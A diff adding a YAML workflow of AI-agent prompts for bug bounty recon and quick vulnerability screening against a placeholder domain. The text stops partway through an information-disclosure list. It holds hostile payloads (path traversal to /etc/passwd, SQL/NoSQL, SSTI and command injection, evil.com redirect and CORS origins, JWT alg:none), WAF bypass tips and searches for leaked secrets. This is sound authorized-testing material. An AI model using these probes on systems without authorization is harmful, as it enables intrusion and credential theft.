@@ -1,0 +1,921 @@
+name: "bugbounty-enhanced-recon"
+description: "Comprehensive bug bounty reconnaissance — deep GitHub/OSINT recon, subdomain enumeration, port scanning, content discovery (directory + parameter fuzzing), JS deep analysis, cloud asset enumeration, WAF bypass profiling, CMS detection, and low-hanging fruit target testing. Designed to surface the widest attack surface before exploitation."
+
+workspace:
+  name: "Bug Bounty Enhanced Recon — ${PROGRAM}"
+
+variables:
+  TARGET: "example.com"
+  TARGET_URL: "https://example.com"
+  PROGRAM: "Example Bug Bounty"
+  SCOPE: "*.example.com"
+  OUT_OF_SCOPE: "blog.example.com, status.example.com"
+  DEPTH: "3"
+  THREADS: "20"
+  GITHUB_TOKEN: ""                      # optional: GitHub API token for private repo / higher rate-limit
+  SECLISTS_PATH: "/usr/share/seclists"   # path to SecLists wordlists
+  WORDLIST_MAIN: "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt"
+  WORDLIST_PARAMS: "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
+  WORDLIST_SUBDOMAINS: "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+  TEST_CREDENTIALS: "test@example.com:Password123!"
+
+phases:
+
+  # ══════════════════════════════════════════════════════════════════════════
+  # PHASE 1 — SCOPE DEFINITION
+  # ══════════════════════════════════════════════════════════════════════════
+  - name: "scope-definition"
+    tasks:
+
+      - name: "define-scope"
+        prompt: |
+          You are a professional bug bounty hunter targeting "${PROGRAM}".
+
+          Primary domain: ${TARGET}
+          In-scope: ${SCOPE}
+          Out-of-scope: ${OUT_OF_SCOPE}
+
+          1. Summarise the attack surface based on the scope declaration above.
+          2. List the most valuable asset categories to focus on (auth flows, API endpoints, file uploads, OAuth integrations, admin panels, payment flows, cloud assets).
+          3. Identify common exclusions typical for this type of programme.
+          4. Output a structured recon plan with priority ordering.
+          Be concise.
+
+      - name: "programme-research"
+        prompt: |
+          Programme: ${PROGRAM}
+
+          Research the programme:
+          1. Search for "${PROGRAM} bug bounty policy" — note special rules, banned techniques, reward tables.
+          2. Search for previously disclosed reports on HackerOne/Bugcrowd/Intigriti for ${PROGRAM} or ${TARGET} to understand what has been found before and avoid duplicates.
+          3. Search job postings for "${TARGET}" (LinkedIn, Indeed, etc.) to infer the tech stack from job descriptions.
+          4. Identify the highest-paying vulnerability categories.
+          Output a structured briefing.
+
+  # ══════════════════════════════════════════════════════════════════════════
+  # PHASE 2 — PASSIVE RECONNAISSANCE (no direct interaction)
+  # ══════════════════════════════════════════════════════════════════════════
+  - name: "passive-recon"
+    tasks:
+
+      - name: "passive-recon-base"
+        depends_on: ["define-scope"]
+        prompt: |
+          Target: ${TARGET}  |  Scope: ${SCOPE}  |  Out-of-scope: ${OUT_OF_SCOPE}
+
+          Perform baseline passive reconnaissance:
+
+          1. **Certificate Transparency** — query crt.sh for ${TARGET}. List all Subject Alternative Names (SANs) and wildcard certs. Flag unexpected hostnames (internal, staging, partner domains).
+
+          2. **DNS Enumeration** — gather all DNS record types:
+             - A / AAAA: IP resolution
+             - MX: mail servers
+             - TXT: SPF, DKIM, DMARC (note spoofing misconfigs)
+             - NS: nameservers
+             - CNAME: canonical names (flag for takeover)
+             - SOA: start of authority
+             - AXFR: attempt zone transfer
+
+          3. **Web Archive (Wayback Machine)** — fetch archived URLs for ${TARGET}. Extract:
+             - Old endpoints and API paths that may still be live
+             - Parameters used historically
+             - Removed/hidden pages
+             - JavaScript file URLs from past snapshots
+
+          4. **WHOIS History** — check WHOIS records for historical ownership, IP ranges, and name-servers. Identify when the domain was first registered.
+
+          5. **Cloud Metadata** — search for ${TARGET} in cloud provider IP ranges:
+             - AWS: check if any subnets belong to AWS
+             - Cloudflare: check for Cloudflare proxied DNS records
+             - Akamai/Fastly: check for CDN-backed assets
+
+          Output a structured passive recon summary.
+
+      - name: "deep-github-recon"
+        depends_on: ["define-scope"]
+        prompt: |
+          Target: ${TARGET}  |  Token: ${GITHUB_TOKEN}
+
+          Perform deep GitHub reconnaissance for "${TARGET}":
+
+          1. **Code Search** — search GitHub for:
+             - "${TARGET}" (all code referencing the domain)
+             - "${TARGET} api_key" / "${TARGET} secret" / "${TARGET} password" / "${TARGET} token"
+             - "${TARGET} aws_key" / "${TARGET} access_key" / "${TARGET} .env"
+             - "${TARGET} slack" / "${TARGET} webhook" / "${TARGET} jwt_secret"
+             - "${TARGET} connection_string" / "${TARGET} db_password"
+             - "api.${TARGET}" / "admin.${TARGET}" (internal hostnames in code)
+
+          2. **Commit Analysis** — search recent commits (past 2 years) for:
+             - Hardcoded credentials accidentally pushed and then removed
+             - API keys, tokens, and secrets in commit history
+             - Internal URLs and staging endpoints
+             - Use `git secret scan` or manual commit-diff review for secrets
+
+          3. **Repository Recon** — for each repo found referencing ${TARGET}:
+             - Check repository metadata: description, topics, README
+             - Check Issues and Discussions for leaked internal info
+             - Check Wiki pages for internal documentation
+             - Check Actions/CI workflows for secrets and internal URLs
+             - Check Projects board for internal info
+
+          4. **Gist Search** — search GitHub Gists for "${TARGET}":
+             - Often contains config snippets, API keys, and internal documentation
+             - Check gist comments and revisions
+
+          5. **Dependency Analysis** — for repos that use ${TARGET}:
+             - Check package.json, requirements.txt, Gemfile, go.mod for the company's internal packages
+             - Internal package names can reveal internal tooling
+
+          6. **Employee Recon** — identify employees of the company:
+             - Search "github.com/companyname" for organisation members
+             - Check employee personal repos for accidental leaks
+             - Search for company email patterns in commit authors
+
+          7. **Secret Scanning Results** — if using GitHub token:
+             - Use GitHub's secret scanning API to fetch known alerts
+             - Check notifications for token leaks
+
+          For each finding: source URL, what was leaked, severity.
+
+          If ${GITHUB_TOKEN} is empty, note that results are limited to public repos without authentication — recommend providing a token for deeper recon.
+
+      - name: "google-dorking-advanced"
+        depends_on: ["define-scope"]
+        prompt: |
+          Target: ${TARGET}  |  Programme: ${PROGRAM}
+
+          Conduct advanced Google dork searches:
+
+          **Standard dorks:**
+          - site:${TARGET} ext:php OR ext:asp OR ext:aspx OR ext:jsp
+          - site:${TARGET} inurl:admin OR inurl:login OR inurl:dashboard OR inurl:panel OR inurl:wp-admin
+          - site:${TARGET} inurl:api OR inurl:v1 OR inurl:v2 OR inurl:v3 OR inurl:graphql
+          - site:${TARGET} filetype:pdf OR filetype:xlsx OR filetype:docx OR filetype:pptx OR filetype:env OR filetype:sql OR filetype:bak OR filetype:csv
+          - site:${TARGET} inurl:config OR inurl:backup OR inurl:.git OR inurl:.svn
+          - site:${TARGET} "confidential" OR "internal use only" OR "do not distribute" OR "not for external"
+          - site:${TARGET} "powered by" OR "built with" (tech fingerprint confirmation)
+          - site:${TARGET} intitle:"index of" (directory listing)
+
+          **Leak sites:**
+          - "${TARGET}" site:pastebin.com
+          - "${TARGET}" site:ghostbin.com
+          - "${TARGET}" site:controlc.com
+          - "${TARGET}" site:justpaste.it
+          - "${TARGET}" site:hastebin.com
+
+          **Social/Dev platforms:**
+          - "${TARGET}" site:stackoverflow.com OR site:stackexchange.com
+          - "${TARGET}" site:reddit.com (internal discussions)
+          - "${TARGET}" site:medium.com OR site:dev.to (engineering blogs with tech stack)
+          - "${TARGET}" site:linkedin.com (employee profiles, tech stack from skills)
+
+          **Cloud/Infra:**
+          - site:s3.amazonaws.com "${TARGET}"
+          - site:blob.core.windows.net "${TARGET}"
+          - site:storage.googleapis.com "${TARGET}"
+          - site:execute-api.*.amazonaws.com "${TARGET}"
+
+          For each interesting URL, note the URL and why it is interesting.
+
+      - name: "shodan-and-osint"
+        depends_on: ["define-scope"]
+        prompt: |
+          Target: ${TARGET}
+
+          Conduct Shodan / Censys / FOFA recon:
+
+          1. **Shodan queries:**
+             - hostname:"${TARGET}" (all services on subdomains)
+             - ssl.cert.subject.CN:"${TARGET}" (all hosts sharing a certificate)
+             - org:"Organization Name" port:443 (if org name is known)
+             - http.title:"${TARGET}" (servers returning specific title)
+
+          2. **Censys queries** (similar scope):
+             - services.service_name: HTTP and dns.names: ${TARGET}
+             - services.tls.certificates.leaf_data.subject.common_name: ${TARGET}
+
+          3. **Search for exposed dashboards/services:**
+             - "kibana" + "${TARGET}"
+             - "jenkins" + "${TARGET}"
+             - "grafana" + "${TARGET}"
+             - "jupyter" + "${TARGET}"
+             - "prometheus" + "${TARGET}"
+             - "mongodb" + port:27017 + "${TARGET}"
+             - "elasticsearch" + port:9200 + "${TARGET}"
+
+          4. **Search for camera/IoT devices** in the same IP range.
+
+          Note: if Shodan/Censys FQDN results overlap with subdomain enumeration, flag the new services/ports found only in these datasets (services not visible from a standard port scan).
+
+  # ══════════════════════════════════════════════════════════════════════════
+  # PHASE 3 — ACTIVE RECONNAISSANCE (direct target interaction)
+  # ══════════════════════════════════════════════════════════════════════════
+  - name: "active-recon"
+    tasks:
+
+      - name: "subdomain-enumeration"
+        depends_on: ["define-scope"]
+        prompt: |
+          Target: ${TARGET}  |  Scope: ${SCOPE}  |  Out-of-scope: ${OUT_OF_SCOPE}  |  Wordlist: ${WORDLIST_SUBDOMAINS}
+
+          Perform comprehensive subdomain enumeration:
+
+          1. **Passive techniques:**
+             - crt.sh (certificate transparency logs)
+             - DNS datasets (SecurityTrails, AlienVault OTX, VirusTotal, Shodan)
+             - Web archives (Wayback Machine / CommonCrawl)
+             - GitHub search (code references to subdomains)
+             - Sublist3r / Assetfinder / Amass passive sources
+             - RapidDNS / Riddler / DNSDumpster
+
+          2. **Active techniques:**
+             - DNS brute-force using wordlist: ${WORDLIST_SUBDOMAINS}
+               Focus on: admin, dev, stage, beta, test, api, mail, portal, app, cdn, static, assets, s3, jenkins, git, jira, confluence
+             - DNS zone transfer (AXFR) attempt
+             - DNS resolution and wildcard detection
+
+          3. **Post-processing:**
+             - Resolve all discovered subdomains to IP addresses
+             - Run httpx on all live subdomains to check HTTP/HTTPS response (status code, tech, title)
+             - Flag subdomains pointing to cloud providers (AWS S3, Azure, GCP, GitHub Pages, Heroku) as takeover candidates
+             - Group by CNAME target for takeover analysis
+             - Identify subdomains on the same IP for virtual host discovery
+
+          4. **Output:**
+             - Deduplicated subdomain list sorted by interest (admin > api > auth > dev > cdn > everything else)
+             - Status codes, IPs, tech detection
+             - Takeover candidates with CNAME targets
+
+      - name: "port-and-service-scan"
+        depends_on: ["define-scope"]
+        prompt: |
+          Target: ${TARGET}  |  Scope: ${SCOPE}
+
+          Perform port and service scanning:
+
+          1. Run a TCP scan across all live subdomain IPs and apex IP:
+             - Top 1000 ports (fast scan)
+             - All ports on interesting IPs (if scope allows)
+             - Version detection on open ports (service/version probe)
+
+          2. Flag dangerous exposed services:
+             - FTP (21) — anonymous login allowed?
+             - SSH (22) — version, weak ciphers
+             - Telnet (23) — exposed
+             - SMTP (25) — open relay check
+             - DNS (53) — zone transfer?
+             - SMB (445) — null session?
+             - RDP (3389) — exposed
+             - Redis (6379) — no auth?
+             - Elasticsearch (9200) — unauthenticated queries?
+             - MongoDB (27017) — no auth?
+             - Cassandra (9042) — exposed
+             - Memcached (11211) — exposed
+             - Docker (2375/2376) — unauthenticated API?
+             - Kubernetes (6443, 10250) — exposed
+             - Jenkins (8080, 50000) — unauthenticated access?
+             - Jupyter (8888) — no token?
+             - Prometheus (9090) — exposed metrics
+             - Grafana (3000) — default credentials?
+
+          3. For each interesting port, note:
+             - Service name and version
+             - Severity estimate (Critical / High / Medium / Low / Info)
+             - Potential exploitation path
+
+          4. Check for UDP services on common ports (DNS, SNMP, NTP)
+
+      - name: "technology-fingerprinting"
+        depends_on: ["subdomain-enumeration"]
+        prompt: |
+          Target: ${TARGET}  |  Scope: ${SCOPE}
+
+          Deep technology fingerprint:
+
+          1. **Web Server Identification:**
+             - Nginx, Apache, IIS, Caddy, Tomcat, Jetty, Gunicorn, uWSGI, Node.js (Express, Koa)
+             - Version strings from headers: Server, X-Powered-By, X-AspNet-Version
+             - Known CVEs for detected versions (last 3 years)
+
+          2. **Application Framework:**
+             - Frontend: React, Vue, Angular, Svelte, jQuery
+             - Backend: Django, Rails, Laravel, Spring, Express, FastAPI, Flask, .NET
+             - Version fingerprints from headers, cookies (.AspNetCore, PHPSESSID, JSESSIONID), HTML meta tags
+
+          3. **WAF / CDN Detection:**
+             - Cloudflare, Akamai, AWS WAF, Fastly, CloudFront, Imperva, Sucuri, ModSecurity
+             - Bypass considerations for each WAF type:
+               - Cloudflare: X-Forwarded-For bypass, HTTP method fuzzing, path normalization
+               - AWS WAF: size limits, SQLi encoding variations
+               - Akamai: header manipulation, chunked encoding bypass
+             - Test WAF detection: send malicious payload, note blocked vs allowed responses
+
+          4. **CMS Detection (if applicable):**
+             - WordPress: /wp-admin, /wp-content, /wp-json, readme.html
+             - Drupal: /user/login, /node/1, CHANGELOG.txt
+             - Joomla: /administrator, /components, plugins
+             - Magento: /admin, static version paths
+             - Shopify: /admin, /collections
+             - Check version-specific vulnerabilities
+
+          5. **Third-party Integrations:**
+             - Analytics: GA, Hotjar, Mixpanel, Heap
+             - Auth: Auth0, Okta, Firebase, OAuth providers
+             - Payments: Stripe, PayPal, Braintree, Square
+             - CRM: Salesforce, HubSpot, Zendesk, Intercom
+             - Monitoring: Datadog, New Relic, Sentry, Rollbar
+
+          6. **Client-side Analysis:**
+             - Source maps exposed? (.map files)
+             - Hardcoded API keys in HTML/JS source
+             - Environment variables leaked in bundled code
+
+          Output: full stack summary, WAF type + bypass tips, CMS version, known CVEs, interesting third-parties.
+
+  # ══════════════════════════════════════════════════════════════════════════
+  # PHASE 4 — CONTENT DISCOVERY & FUZZING
+  # ══════════════════════════════════════════════════════════════════════════
+  - name: "content-discovery"
+    tasks:
+
+      - name: "directory-fuzzing"
+        depends_on: ["subdomain-enumeration", "technology-fingerprinting"]
+        prompt: |
+          Target: ${TARGET}  |  Target URL: ${TARGET_URL}  |  Wordlist: ${WORDLIST_MAIN}
+
+          Perform comprehensive directory and file fuzzing:
+
+          1. **Directory brute-force** on all live web subdomains:
+             - Use wordlist: ${WORDLIST_MAIN}
+             - Extensions to append: .php, .asp, .aspx, .jsp, .do, .action, .json, .xml, .txt, .conf, .bak, .old, .swp, .save
+             - Common admin paths: /admin, /dashboard, /panel, /manager, /backend, /console, /operator
+             - Common API paths: /api, /api/v1, /v1, /api/v2, /graphql, /swagger, /openapi
+             - Common config paths: /.git, /.env, /.svn, /.htaccess, /config, /backup, /dump
+
+          2. **CMS-specific fuzzing** (if CMS detected):
+             - WordPress: /wp-admin, /wp-content/uploads, /wp-json/wp/v2/users
+             - Drupal: /user, /admin, /node/add, /sites/default/files
+             - Joomla: /administrator, /components, /modules, /cache
+
+          3. **Reverse proxy / path traversal probing:**
+             - /..;/..;/..;/etc/passwd (IIS Tomcat)
+             - /static/../../../etc/passwd
+             - /%2e%2e/%2e%2e/etc/passwd (URL encoding bypass)
+
+          4. **Response analysis:**
+             - Categorise status codes: 200 (found), 301/302 (redirect), 401/403 (exists but restricted), 500 (error)
+             - Filter false positives (default pages, identical 403 pages)
+             - Flag responses that differ in size, title, or content — they likely serve unique resources
+
+          5. **Backup file discovery:**
+             - Common patterns: index.php.bak, config.php.old, wp-config.php.save, db.sql, dump.sql
+             - Append common backup extensions to all discovered files
+
+          Output: sorted list of confirmed paths, status codes, and notes on interesting findings (admin panels, API endpoints, config files, backups).
+
+      - name: "parameter-fuzzing"
+        depends_on: ["subdomain-enumeration", "technology-fingerprinting"]
+        prompt: |
+          Target: ${TARGET}  |  Wordlist: ${WORDLIST_PARAMS}
+
+          Discover hidden and undocumented parameters:
+
+          1. **Collect known parameters from:**
+             - Historical Wayback Machine URLs
+             - JS file endpoints (fetch/axios calls)
+             - Swagger/OpenAPI spec parameters
+             - Common parameter wordlist: ${WORDLIST_PARAMS}
+
+          2. **Parameter fuzzing on key endpoints:**
+             - GET parameter discovery: check for debug/admin mode params
+               Examples: ?debug=true, ?admin=1, ?test=1, ?env=dev, ?internal=1
+             - POST body parameter discovery: add unexpected fields to JSON requests
+               Examples: {"role":"admin"}, {"is_admin":true}, {"verified":true}
+             - Header parameter discovery:
+               Examples: X-Debug: true, X-Internal-Request: true, X-Forwarded-User: admin
+
+          3. **Common hidden parameters to test:**
+             - debug, test, dev, preview, stage, admin, internal
+             - source, action, cmd, exec, command, function
+             - redirect, url, next, return, redirect_to
+             - file, path, document, template, include
+             - id, user_id, account_id, role, permission
+             - callback, jsonp, format, type, response
+             - token, hash, key, signature, nonce
+             - page, offset, limit, start, count
+
+          4. **Response analysis:**
+             - Any parameter causing a different response than baseline = potential injection point or feature flag
+             - Especially interesting: 500 errors, different response sizes, different status codes
+
+          Output: endpoints with discovered hidden parameters and the effect they have on responses.
+
+      - name: "vhost-fuzzing"
+        depends_on: ["subdomain-enumeration"]
+        prompt: |
+          Target: ${TARGET}
+
+          Discover virtual hosts (vhosts) on web servers:
+
+          1. For each discovered web server IP, test virtual host fuzzing:
+             - Use DNS-era subdomains as potential vhosts
+             - Common vhost names: admin, internal, dev, staging, test, beta, api, billing, support, partners
+             - Check for internal-only vhosts that resolve when the Host header is set but DNS does not resolve
+
+          2. Response analysis:
+             - Compare response size, title, status code with base Host header
+             - Different content = different virtual host found
+             - Look for 200 OK on hosts that should not be public
+
+          Output: discovered virtual hosts with their response characteristics.
+
+      - name: "js-deep-analysis"
+        depends_on: ["subdomain-enumeration", "technology-fingerprinting"]
+        prompt: |
+          Target: ${TARGET_URL}
+
+          Deep JavaScript analysis for secrets and hidden attack surface:
+
+          1. **Collect all JS sources:**
+             - Crawl all pages on ${TARGET} and capture all <script src="..."> URLs
+             - Collect JS from Wayback Machine and CommonCrawl
+             - Look for lazy-loaded and dynamic JS bundles
+             - Source map enumeration: try /static/js/main.abc123.js.map
+
+          2. **Static Analysis — Search JS files for:**
+             - API keys: `apiKey`, `api_key`, `x-api-key`, `x-apikey`
+             - Cloud keys: `AKIA` (AWS), `eyJ` (JWT), `sk_live_` (Stripe), `pk_live_`
+             - Tokens: `Bearer `, `token:`, `token =`, `authorization`
+             - URLs: `/api/`, `/internal/`, `/private/`, `/admin/`, `wss://`, `ws://`
+             - Secrets: `secret`, `password`, `credential`, `pwd`, `passwd`
+             - Config: `firebase`, `stripe`, `pusher`, `sentry_dsn`, `datadog`
+             - Internal hosts: `staging.`, `dev.`, `localhost`, `10.`, `192.168.`, `172.16.`
+
+          3. **Endpoint Extraction:**
+             - Extract all URL paths and API calls from JS using regex patterns:
+               - `fetch\s*\(\s*['"]([^'"]+)['"]`
+               - `axios\.(get|post|put|delete|patch)\s*\(['"]([^'"]+)['"]`
+               - `XMLHttpRequest\..*['"]([^'"]+)['"]`
+               - `\/(api|v1|v2|v3|rest)\/[a-zA-Z0-9_\-/{}]+`
+             - Look for routes referenced but not visible in the UI (feature-flagged)
+
+          4. **Source Map Analysis:**
+             - If source maps exist, download and reconstruct original source
+             - Original source reveals: comments, full variable names, internal notes, commented-out debug code
+
+          5. **Hardcoded Credentials:**
+             - Search for `username`, `password` in JS
+             - Search for `Bearer` token assignments
+             - Search for OAuth `client_id`, `client_secret`
+
+          Report: all secrets found (redacted after first 4 chars), API endpoints discovered, interesting function names, source map status.
+
+      - name: "cloud-asset-enumeration"
+        depends_on: ["subdomain-enumeration"]
+        prompt: |
+          Target: ${TARGET}
+
+          Enumerate cloud storage assets and infrastructure:
+
+          1. **AWS S3 Bucket Enumeration:**
+             - Common patterns: ${TARGET}-assets, ${TARGET}-backup, ${TARGET}-static, ${TARGET}-media, ${TARGET}-uploads, ${TARGET}-data, ${TARGET}-logs, ${TARGET}-config
+             - Permutation patterns: ${TARGET}.s3.amazonaws.com, s3-${TARGET}, ${TARGET}-s3, ${TARGET}-bucket
+             - For each bucket: check listing enabled? public read? public write?
+             - URL patterns to check:
+               - http://${TARGET}.s3.amazonaws.com
+               - http://s3.amazonaws.com/${TARGET}
+               - http://${TARGET}.s3-website-us-east-1.amazonaws.com
+               - http://${TARGET}.s3-website-eu-west-1.amazonaws.com
+
+          2. **Azure Blob/Storage Enumeration:**
+             - ${TARGET}.blob.core.windows.net
+             - ${TARGET}storage.blob.core.windows.net
+             - ${TARGET}assets.blob.core.windows.net
+             - ${TARGET}backup.blob.core.windows.net
+             - Check for public container access and file listing
+
+          3. **GCP Cloud Storage Enumeration:**
+             - ${TARGET}.storage.googleapis.com
+             - ${TARGET}-assets.storage.googleapis.com
+             - ${TARGET}-backup.storage.googleapis.com
+             - Check: bucket allUsers read access, object listing
+
+          4. **DigitalOcean Spaces, Firebase Storage, Alibaba OSS:**
+             - Similar naming patterns
+
+          5. **DNS / CNAME Pointers to Cloud:**
+             - From subdomain enumeration results, check CNAME records pointing to
+               s3.amazonaws.com, cloudfront.net, azurewebsites.net, azureedge.net,
+               storage.googleapis.com, herokudns.com, github.io, fastly.net, pantheonsite.io
+
+          Output: list of discovered cloud assets, their access level (public/private), and any exposed files.
+
+  # ══════════════════════════════════════════════════════════════════════════
+  # PHASE 5 — WEB CRAWLING & API DISCOVERY
+  # ══════════════════════════════════════════════════════════════════════════
+  - name: "crawl-and-api"
+    tasks:
+
+      - name: "web-crawl"
+        depends_on: ["subdomain-enumeration", "technology-fingerprinting"]
+        prompt: |
+          Target: ${TARGET_URL}  |  Depth: ${DEPTH}
+
+          Crawl the web application to map all accessible endpoints:
+
+          1. **Spidering:** crawl up to depth ${DEPTH} from the homepage.
+             - Follow HTML links, form actions, redirects, and JS-injected routes
+             - Follow sitemap.xml and robots.txt discovered paths
+
+          2. **For each page/endpoint, capture:**
+             - Full URL, HTTP method, response status code
+             - Content-Type, Set-Cookie, X-Frame-Options, CSP, CORS headers
+             - Page title and meta description
+             - Form fields (name, type, action)
+
+          3. **Identify high-value pages:**
+             - Login pages, registration, password reset
+             - OAuth callbacks / SSO entry points
+             - File upload endpoints
+             - API endpoints (REST, GraphQL, WebSocket)
+             - Admin interfaces, dashboards
+             - Pages that accept user input (search, comment, contact, feedback)
+             - Payment / checkout pages
+
+          4. **Hidden endpoint discovery:**
+             - Check robots.txt for disallowed paths
+             - Check sitemap.xml for hidden pages
+             - Check for /.well-known/ endpoints
+             - Note any unauthenticated pages that should require auth
+
+          5. **Parameter collection:**
+             - Collect all query string parameters
+             - Collect all POST body parameter names
+             - These are injection targets
+
+          Output: structured endpoint inventory with metadata.
+
+      - name: "api-discovery"
+        depends_on: ["subdomain-enumeration", "technology-fingerprinting"]
+        prompt: |
+          Target: ${TARGET_URL}
+
+          Discover and document all API endpoints:
+
+          1. **OpenAPI/Swagger Discovery:**
+             - Probe common paths:
+               /swagger.json, /swagger.yaml, /swagger-ui.html, /swagger-ui/
+               /openapi.json, /openapi.yaml, /openapi/
+               /api-docs, /api-docs.json, /api/docs, /api/v1/docs, /api/v2/docs
+               /v1, /v1/, /v2, /v3, /v4
+               /.well-known/openapi, /redoc, /rapidoc
+               /docs, /docs/, /documentation, /developer
+               /api/swagger, /api/openapi, /api/schema
+             - If found, download and parse the spec:
+               - List all endpoints, methods, parameters
+               - Identify mark as deprecated or internal
+               - Note auth requirements per endpoint
+               - Extract all server URLs
+
+          2. **GraphQL Discovery:**
+             - Probe: /graphql, /gql, /graphiql, /graphql/console, /api/graphql
+                      /v1/graphql, /v2/graphql, /query, /api/query
+                      /internal/graphql, /admin/graphql
+             - Confirm with POST introspection probe:
+               `{"query":"{ __schema { queryType { name } } }"}`
+             - If introspection is enabled, dump full schema:
+               types, queries, mutations, subscriptions, fields, arguments
+             - Check for dangerous features:
+               - Introspection enabled
+               - Field suggestions enabled
+               - Batch query support
+               - Mutations without auth
+
+          3. **REST API Version Enumeration:**
+             - Test: /api/v1/, /api/v2/, /api/v3/, /api/v4/
+             - Check which versions are still live
+             - Compare auth requirements across versions (old versions may be unauthenticated)
+             - Look for shadow APIs: /internal/api/, /private/api/, /admin/api/
+
+          4. **gRPC / WebSocket Discovery:**
+             - Check for WebSocket endpoints (wss://) in JS source
+             - Check for gRPC reflection endpoint
+             - Check for SOAP/XML-RPC endpoints
+
+          5. **API Key Leakage:**
+             - Check CORS responses for API keys in headers
+             - Check HTML/JS for hardcoded API keys
+             - Check URL parameters for API keys
+
+          Output: full API inventory (REST, GraphQL, WebSocket), auth requirements, endpoints, and any unprotected endpoints.
+
+  # ══════════════════════════════════════════════════════════════════════════
+  # PHASE 6 — LOW-HANGING FRUIT TARGET TESTING
+  # ══════════════════════════════════════════════════════════════════════════
+  - name: "target-testing"
+    tasks:
+
+      - name: "subdomain-takeover"
+        depends_on: ["subdomain-enumeration"]
+        prompt: |
+          Target: ${TARGET}
+
+          Test all flagged takeover candidates:
+
+          1. For each subdomain with a CNAME to a known cloud service:
+             - Verify the CNAME target is unclaimed (NXDOMAIN, 404, or service-specific error page)
+             - Services to check:
+               - AWS S3/CloudFront: NoSuchBucket, AccessDenied
+               - Azure: 404 Not Found, pageservices.azurewebsites.net
+               - GitHub Pages: 404 There isn't a GitHub Pages site here
+               - Heroku: No such app
+               - Fastly: Fastly error: unknown domain
+               - Shopify: Only one step left
+               - Pantheon: The gods are angry
+               - Tumblr: There's nothing here
+               - Ghost: The site you were looking for doesn't exist
+               - Wordpress.com: Do you want to register
+               - Unbounce: The page you are looking for is no longer available
+               - Helpjuice: No such help page
+               - Zendesk: This page has been deleted
+               - Readme.io: Project doesnt exist
+               - Aha.io: There is no Aha! account at this domain
+
+          2. Also check for NS takeover (NS delegation to non-existent nameservers)
+
+          3. For each confirmed takeover:
+             - Service type, CNAME value, evidence (error page content)
+             - Confidence level (confirmed / potential / info)
+
+      - name: "cors-misconfiguration"
+        depends_on: ["js-deep-analysis", "api-discovery"]
+        prompt: |
+          Target: ${TARGET}
+
+          Test for CORS misconfigurations:
+
+          1. For each discovered API endpoint and subdomain:
+             - Send OPTIONS request with Origin: https://evil.com
+             - Check if Access-Control-Allow-Origin: https://evil.com or *
+             - Check if Access-Control-Allow-Credentials: true
+             - If both: full CORS vulnerability (attacker can read sensitive API responses)
+
+          2. Test Origin reflection:
+             - Origin: https://evil.com → reflected in ACAO header = weak validation
+             - Origin: null → reflected (sandboxed iframes, data URIs)
+             - Origin: https://attack.com.evil.com → prefix match bypass
+             - Origin: https://evil-attack.com → suffix match bypass
+
+          3. Test preflight bypass:
+             - Some servers only validate CORS on OPTIONS but not on actual GET/POST
+             - Send direct GET with Origin header, skip OPTIONS
+
+          Output: endpoints vulnerable to CORS data exfiltration.
+
+      - name: "basic-injection-screening"
+        depends_on: ["parameter-fuzzing", "web-crawl"]
+        prompt: |
+          Target: ${TARGET}
+
+          Screen for common, easy-to-find injection vulnerabilities:
+
+          1. **SQL Injection (quick check):**
+             - Test all parameters from parameter fuzzing and web crawl
+             - Payloads: `'`, `''`, `' OR '1'='1`, `1 AND SLEEP(5)--`, `1 UNION SELECT 1--`
+             - Focus on search fields, login, ID parameters
+             - Look for: database errors, timing differences, different response content
+
+          2. **NoSQL Injection:**
+             - For JSON APIs, test: `{"$gt":""}`, `{"$ne":null}`, `{"$regex":".*"}`
+             - Test in login: `{"email": {"$gt":""}, "password": {"$gt":""}}`
+
+          3. **SSTI (quick check):**
+             - Test all user-reflected input fields
+             - Payloads: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`
+             - If `49` or `14` in response = SSTI confirmed
+
+          4. **Command Injection (quick check):**
+             - Test parameters that may feed OS commands (ping, traceroute, nslookup)
+             - Payloads: `; id`, `| id`, `` `id` ``, `$(id)`
+             - Look for user/group info in response
+
+          5. **Open Redirect:**
+             - Test all redirect parameters: `?url=`, `?redirect=`, `?next=`, `?return=`, `?to=`
+             - Payloads: `https://evil.com`, `//evil.com`, `/\evil.com`, `https:evil.com`
+             - Check if domain is whitelisted (try subdomains of target)
+
+          6. **XXE (quick check):**
+             - For XML/SVG upload endpoints or XML-accepting APIs
+             - Test: basic XXE to read /etc/hostname
+
+          Output: findings with endpoint, parameter, payload, and response snippet.
+
+      - name: "jwt-and-auth-screening"
+        depends_on: ["api-discovery", "technology-fingerprinting"]
+        prompt: |
+          Target: ${TARGET}  |  Credentials: ${TEST_CREDENTIALS}
+
+          Quick screening for authentication-related vulnerabilities:
+
+          1. **JWT Analysis (if JWTs found):**
+             - Decode header and payload (base64 decode)
+             - Test `alg: none` attack
+             - Test algorithm confusion (RS256 → HS256 with public key)
+             - Check for weak secret (try: secret, password, 12345, ${TARGET})
+             - Check for sensitive data in payload (PII, roles)
+             - Check token expiry: is it long-lived?
+             - Check kid header injection
+
+          2. **Session Analysis:**
+             - Is session token predictable?
+             - Does session change after login?
+             - Are cookies HttpOnly, Secure, SameSite?
+             - Is session invalidated on logout?
+
+          3. **Login Endpoint Testing:**
+             - Username enumeration (different responses for valid vs invalid user)
+             - Rate limiting / brute-force protection
+             - Default credentials testing (admin:admin, admin:password, test:test)
+             - Password reset token predictability
+
+          Output: vulnerabilities found with PoC commands.
+
+      - name: "graphql-screening"
+        depends_on: ["api-discovery"]
+        prompt: |
+          Target: ${TARGET}
+
+          Quick GraphQL screening:
+
+          1. If GraphQL endpoint found:
+             - Run introspection query (if not already done)
+             - Check field suggestions (`{ usr { id } }` → "Did you mean 'user'?")
+             - Test batching (send 50 queries in one request) — bypass rate limiting
+             - Test for field-level auth bypass: query admin-only fields without admin session
+
+          2. Check for common GraphQL vulnerabilities:
+             - Introspection enabled = schema leakage
+             - Batching without restriction = DoS / rate-limit bypass
+             - Deeply nested queries = DoS (try `{user{posts{comments{user{posts{...}}}}}}`)
+             - Missing auth on sensitive mutations
+
+          Output: GraphQL findings with queries used.
+
+      - name: "information-disclosure"
+        depends_on: ["directory-fuzzing", "web-crawl"]
+        prompt: |
+          Target: ${TARGET}
+
+          Check for information disclosure:
+
+          1. **Sensitive file discovery:**
+             - /.git/config (Git repository exposed)
+             - /.env (environment variables)
+             - /wp-config.php (WordPress config)
+             - /robots.txt (disallowed paths)
